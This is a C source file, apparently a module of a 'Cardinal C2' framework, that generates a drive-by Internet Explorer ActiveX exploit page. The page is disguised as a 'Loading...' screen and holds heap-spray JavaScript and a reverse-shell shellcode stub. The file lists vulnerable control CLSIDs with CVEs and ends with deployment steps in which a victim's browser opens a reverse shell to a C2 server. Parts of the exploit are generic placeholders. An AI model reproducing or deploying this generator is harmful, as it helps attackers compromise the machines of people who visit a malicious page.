/*
 * Cardinal C2 Framework - IE ActiveX Exploit Module
 * Internet Explorer 6/7/8 ActiveX Control Vulnerabilities
 * Multiple CVEs - COM Object Exploitation
 * Target: Windows XP, Vista, 7, Server 2003/2008
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_banner() {
    printf("\n");
    printf("Cardinal C2 - IE ActiveX Exploit Generator\n");
    printf("Multiple CVE - ActiveX Control Exploitation\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

// Shellcode placeholder (reverse shell)
const char* shellcode_hex = 
    "\\x90\\x90\\x90\\x90"
    "\\x33\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e"
    "\\x81\\x76\\x0e\\x7e\\x4b\\xb6\\xfc\\x83\\xee\\xfc\\xe2\\xf4";

void generate_activex_exploit(const char* output_file, const char* clsid, int exploit_type) {
    FILE* fp = fopen(output_file, "w");
    if (!fp) {
        printf("[!] Failed to create file\n");
        return;
    }
    
    fprintf(fp, "<html>\n");
    fprintf(fp, "<head>\n");
    fprintf(fp, "<title>Loading...</title>\n");
    fprintf(fp, "<script language=\"javascript\">\n\n");
    
    // Heap spray for reliable exploitation
    fprintf(fp, "// Heap spray\n");
    fprintf(fp, "var shellcode = unescape(\"%s\");\n", shellcode_hex);
    fprintf(fp, "var nop_sled = unescape(\"%%u9090%%u9090\");\n");
    fprintf(fp, "while (nop_sled.length < 0x100000) nop_sled += nop_sled;\n");
    fprintf(fp, "var block = nop_sled.substring(0, 0x100000 - shellcode.length);\n");
    fprintf(fp, "var spray = new Array();\n");
    fprintf(fp, "for (var i = 0; i < 200; i++) {\n");
    fprintf(fp, "    spray[i] = block + shellcode;\n");
    fprintf(fp, "}\n\n");
    
    fprintf(fp, "// Exploit function\n");
    fprintf(fp, "function exploit() {\n");
    fprintf(fp, "    try {\n");
    fprintf(fp, "        var obj = new ActiveXObject(\"%s\");\n", clsid);
    
    switch (exploit_type) {
        case 1: // Buffer overflow
            fprintf(fp, "        var buf = \"\";\n");
            fprintf(fp, "        for (var i = 0; i < 1000; i++) buf += \"A\";\n");
            fprintf(fp, "        obj.vulnerable_method(buf);\n");
            break;
            
        case 2: // Integer overflow
            fprintf(fp, "        obj.set_size(0xFFFFFFFF);\n");
            fprintf(fp, "        obj.allocate();\n");
            break;
            
        case 3: // Use-after-free
            fprintf(fp, "        obj.create_object();\n");
            fprintf(fp, "        obj.free_object();\n");
            fprintf(fp, "        obj.use_object();\n");
            break;
            
        default:
            fprintf(fp, "        obj.vulnerable_method(\"exploit\");\n");
    }
    
    fprintf(fp, "    } catch(e) {\n");
    fprintf(fp, "        // Exploit may have succeeded\n");
    fprintf(fp, "    }\n");
    fprintf(fp, "}\n\n");
    
    fprintf(fp, "window.onload = function() {\n");
    fprintf(fp, "    setTimeout(exploit, 1000);\n");
    fprintf(fp, "};\n");
    
    fprintf(fp, "</script>\n");
    fprintf(fp, "</head>\n");
    fprintf(fp, "<body>\n");
    fprintf(fp, "<h1>Loading...</h1>\n");
    fprintf(fp, "<p>Please wait while content loads...</p>\n");
    fprintf(fp, "</body>\n");
    fprintf(fp, "</html>\n");
    
    fclose(fp);
    
    printf("[+] Generated ActiveX exploit: %s\n", output_file);
}

void list_vulnerable_controls() {
    printf("\nKnown Vulnerable ActiveX Controls:\n");
    printf("==================================\n\n");
    
    printf("1. Microsoft DirectShow (Quartz.dll)\n");
    printf("   CLSID: {6BF52A52-394A-11d3-B153-00C04F79FAA6}\n");
    printf("   CVE: CVE-2008-0015\n\n");
    
    printf("2. Snapshot Viewer for Microsoft Access\n");
    printf("   CLSID: {F0E42D50-368C-11D0-AD81-00A0C90DC8D9}\n");
    printf("   CVE: CVE-2008-2463\n\n");
    
    printf("3. Microsoft XML Core Services\n");
    printf("   CLSID: {F6D90F11-9C73-11D3-B32E-00C04F990BB4}\n");
    printf("   CVE: CVE-2007-0099\n\n");
    
    printf("4. Microsoft Video ActiveX Control\n");
    printf("   CLSID: {05589FA1-C356-11CE-BF01-00AA0055595A}\n");
    printf("   CVE: CVE-2008-0015\n\n");
    
    printf("5. Microsoft Office Web Components\n");
    printf("   CLSID: {0002E510-0000-0000-C000-000000000046}\n");
    printf("   CVE: CVE-2009-1136\n\n");
    
    printf("6. Microsoft Agent Control\n");
    printf("   CLSID: {D45FD31B-5C6E-11D1-9EC1-00C04FD7081F}\n");
    printf("   CVE: CVE-2007-0938\n\n");
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 2) {
        printf("Usage:\n");
        printf("  %s list                     - List vulnerable ActiveX controls\n", argv[0]);
        printf("  %s <output.html> <clsid>    - Generate exploit\n", argv[0]);
        printf("\n");
        printf("Example:\n");
        printf("  %s exploit.html {6BF52A52-394A-11d3-B153-00C04F79FAA6}\n", argv[0]);
        printf("\n");
        return 1;
    }
    
    if (strcmp(argv[1], "list") == 0) {
        list_vulnerable_controls();
        return 0;
    }
    
    if (argc < 3) {
        printf("[!] CLSID required\n");
        return 1;
    }
    
    const char* output_file = argv[1];
    const char* clsid = argv[2];
    
    printf("[*] Generating ActiveX exploit...\n");
    printf("[*] Target CLSID: %s\n", clsid);
    printf("[*] Output file: %s\n\n", output_file);
    
    // Generate different exploit types
    generate_activex_exploit(output_file, clsid, 1);
    
    printf("\n[+] Exploit generation complete\n");
    printf("\nDeployment:\n");
    printf("1. Host %s on a web server\n", output_file);
    printf("2. Target visits page with vulnerable IE version\n");
    printf("3. ActiveX control is exploited\n");
    printf("4. Shellcode executes with user privileges\n");
    printf("5. Reverse shell connects to C2 server\n");
    
    return 0;
}
